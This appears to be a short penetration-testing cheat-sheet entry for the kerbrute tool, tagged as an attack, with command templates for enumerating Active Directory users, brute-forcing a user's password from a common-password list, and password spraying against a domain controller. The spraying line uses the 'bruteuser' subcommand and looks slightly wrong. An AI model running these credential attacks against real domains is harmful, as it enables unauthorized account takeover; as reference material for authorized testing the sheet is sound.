# kerbrute
#plateform/linux #target/remote #cat/ATTACK

## Test userlist
```
kerbrute userenum -d <domain> --dc <target> <usersfile|test_users.txt>
```

## Bruteforce user
```
kerbrute bruteuser -d <domain> --dc <target> <wordlist|/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt> <user>
```

## Password spray
```
kerbrute bruteuser -d <domain> --dc <target> <usersfile|valid_users.txt> <passwd>
```
